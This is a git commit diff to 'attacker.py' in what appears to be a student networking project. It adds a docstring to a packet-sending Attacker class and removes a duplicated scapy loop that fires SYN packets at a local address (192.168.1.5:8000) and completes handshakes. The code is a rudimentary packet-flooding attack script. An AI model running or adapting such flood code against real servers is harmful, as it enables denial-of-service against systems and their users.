18ee878a3b68181e5ae7b3333abb933640ffe416
TomLev6 <100039158+TomLev6@users.noreply.github.com>
2023-04-28 11:49:18 +0300

    Update attacker.py

--- project ideas/project code/attacker.py
+++ project ideas/project code/attacker.py
@@ -8,6 +8,9 @@ class Attacker:
         self.amount = packets_amount
 
     def send_packets(self):
+        """
+        sends packet to the server
+        """
         i = 1
         while i < self.amount:
             IP1 = IP(dst=self.target)
@@ -21,20 +24,3 @@ class Attacker:
 
 a = Attacker("192.168.1.5", 10000)
 a.send_packets()
-
-from scapy.all import *
-from scapy.layers.inet import IP, TCP
-
-target_IP = '192.168.1.5'
-while True:
-    IP1 = IP(dst=target_IP)
-    TCP1 = TCP(dport=8000, sport=28588, flags="S")
-    syn_pkt = IP1 / TCP1
-    answer = sr1(syn_pkt, inter=.0001, timeout=10, verbose=0)
-    if answer is not None:
-        answer.show()
-        ack_pkt = IP1 / TCP(dport=28588, flags="A", ack=answer[TCP].seq + 1)
-        last_ans = sr1(ack_pkt, inter=.001)
-        print(str(last_ans[Raw].load))
-
-
